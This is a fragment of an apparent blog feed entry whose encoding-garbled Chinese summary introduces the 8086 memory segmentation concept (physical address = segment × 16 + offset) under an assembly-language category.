    <summary type="html">&lt;h1 id=&quot;2-8æ®µçš„æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#2-8æ®µçš„æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;2.8æ®µçš„æ¦‚å¿µ&quot;&gt;&lt;/a&gt;2.8æ®µçš„æ¦‚å¿µ&lt;/h1&gt;&lt;p&gt;å†…å­˜å¹¶æ²¡æœ‰åˆ†æ®µï¼ŒçŸ­çš„åˆ’åˆ†æ¥è‡ªäºCPUï¼Œç”±äº8086CPUç”¨â€œæ®µåœ°å€&lt;em&gt;16+åç§»åœ°å€=ç‰©ç†åœ°å€â€</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
</feed>
